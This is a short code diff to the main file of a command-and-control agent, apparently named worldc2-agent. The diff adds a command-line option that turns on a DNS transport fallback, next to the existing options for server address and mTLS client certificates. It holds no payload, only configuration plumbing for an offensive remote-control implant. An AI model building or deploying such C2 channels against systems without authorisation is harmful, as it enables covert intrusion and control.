@@ -19,6 +19,7 @@ func main() {
 	serverAddr := flag.String("server", "", "C2 server address (host:port)")
 	tlsCert := flag.String("tls-cert", "", "Client certificate PEM (mTLS deployments, issued via POST /api/mtls/cert)")
 	tlsKey := flag.String("tls-key", "", "Client key PEM (mTLS deployments)")
+	dnsDomain := flag.String("dns-domain", "", "Enable the DNS transport fallback for this domain (server needs matching transport.dns_domains)")
 
 	// Also accept positional argument (./worldc2-agent 192.168.1.1:8443)
 	flag.Parse()
@@ -47,6 +48,12 @@ func main() {
 	}
 
 	a := agent.New(addr)
+
+	// Optional DNS transport fallback
+	if *dnsDomain != "" {
+		a.SetDNSDomain(*dnsDomain)
+		log.Printf("[AGENT] DNS transport enabled for domain %q", *dnsDomain)
+	}
 
 	// Optional mTLS client certificate (server tls.mtls: true deployments)
 	if *tlsCert != "" || *tlsKey != "" {
